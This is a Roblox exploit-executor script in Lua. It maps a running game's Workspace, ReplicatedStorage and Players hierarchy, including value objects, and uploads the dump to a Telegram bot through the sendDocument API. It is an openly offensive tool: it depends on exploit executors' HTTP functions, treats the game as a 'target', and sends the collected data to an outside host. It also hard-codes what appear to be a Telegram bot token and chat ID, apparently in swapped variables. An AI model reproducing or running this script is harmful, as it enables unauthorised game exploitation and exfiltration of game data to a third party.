local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- ==========================================
-- 🔐 TELEGRAM CONFIGURATION
-- ==========================================
local BOT_TOKEN = "7635022089"
local CHAT_ID = "8626712218:AAE436iDEOfUNMgatN45CVii-fbA5SGl_-c"
local TELEGRAM_DOC_URL = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendDocument"

-- HTTP Request setup for executors
local httprequest = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)

if not httprequest then
    warn("❌ Executor does not support HTTP requests. Cannot send to Telegram.")
    return
end

-- ==========================================
-- 🛠️ DATA EXTRACTION ENGINE
-- ==========================================
local dumpData = {}
local maxDepth = 6 -- Prevents the script from crashing your game by going too deep
local totalInstances = 0

-- Function to build a clean directory tree format
local function scanHierarchy(parent, depth, prefix)
    if depth > maxDepth then return end

    local children = parent:GetChildren()
    for i, child in ipairs(children) do
        totalInstances = totalInstances + 1
        
        -- Determine tree branch formatting
        local branch = (i == #children) and "└── " or "├── "
        local nextPrefix = prefix .. ((i == #children) and "    " or "│   ")
        
        -- Capture the Object Name and its Class (e.g., [Folder], [Part])
        local line = prefix .. branch .. "[" .. child.ClassName .. "] " .. child.Name
        
        -- If it's a value, capture the actual value (Money, Prices, etc.)
        if child:IsA("ValueBase") then
            line = line .. " = " .. tostring(child.Value)
        end
        
        table.insert(dumpData, line)
        
        -- Recursively scan inside this object
        scanHierarchy(child, depth + 1, nextPrefix)
    end
end

-- ==========================================
-- 🚀 EXECUTION & COMPILING
-- ==========================================
local gameName = "Unknown Game"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

table.insert(dumpData, "==========================================")
table.insert(dumpData, "🎯 TARGET ACQUIRED: " .. gameName)
table.insert(dumpData, "🆔 Place ID: " .. tostring(game.PlaceId))
table.insert(dumpData, "🕒 Timestamp: " .. os.date("%c"))
table.insert(dumpData, "==========================================\n")
table.insert(dumpData, "ROOT DIRECTORY MAP:\n")

print("⏳ Mapping game data... This might freeze the game for a few seconds.")

-- We focus on Workspace (Physical game) and ReplicatedStorage (Remote Events / Game Logic)
table.insert(dumpData, "[Workspace]")
scanHierarchy(workspace, 1, "")

table.insert(dumpData, "\n[ReplicatedStorage]")
scanHierarchy(game:GetService("ReplicatedStorage"), 1, "")

table.insert(dumpData, "\n[Players]")
scanHierarchy(game:GetService("Players"), 1, "")

print("✅ Mapping complete! Found " .. tostring(totalInstances) .. " instances.")

-- ==========================================
-- 📤 SENDING TO TELEGRAM
-- ==========================================
local function sendDocumentToTelegram(fileContent)
    print("📤 Packaging text file and sending to Telegram...")
    local boundary = "----WebKitFormBoundaryDataDump1234"
    local filename = "GameDump_" .. tostring(game.PlaceId) .. ".txt"
    
    local body = "--" .. boundary .. "\r\n"
    body = body .. "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
    body = body .. CHAT_ID .. "\r\n"
    
    body = body .. "--" .. boundary .. "\r\n"
    body = body .. "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
    body = body .. "📦 **DATA DUMP COMPLETE**\n🎮 " .. gameName .. "\n📊 Instances scanned: " .. tostring(totalInstances) .. "\r\n"

    body = body .. "--" .. boundary .. "\r\n"
    body = body .. "Content-Disposition: form-data; name=\"document\"; filename=\"" .. filename .. "\"\r\n"
    body = body .. "Content-Type: text/plain\r\n\r\n"
    body = body .. fileContent .. "\r\n"
    body = body .. "--" .. boundary .. "--\r\n"

    local success, err = pcall(function()
        local response = httprequest({
            Url = TELEGRAM_DOC_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = body
        })
        
        if response.StatusCode == 200 then
            print("🚀 SUCCESS: File delivered to Telegram securely.")
        else
            warn("⚠️ Telegram API Error: " .. tostring(response.Body))
        end
    end)

    if not success then
        warn("❌ Script Error during HTTP request: " .. tostring(err))
    end
end

-- Convert the table to a massive string and send it
local finalDumpString = table.concat(dumpData, "\n")
sendDocumentToTelegram(finalDumpString)
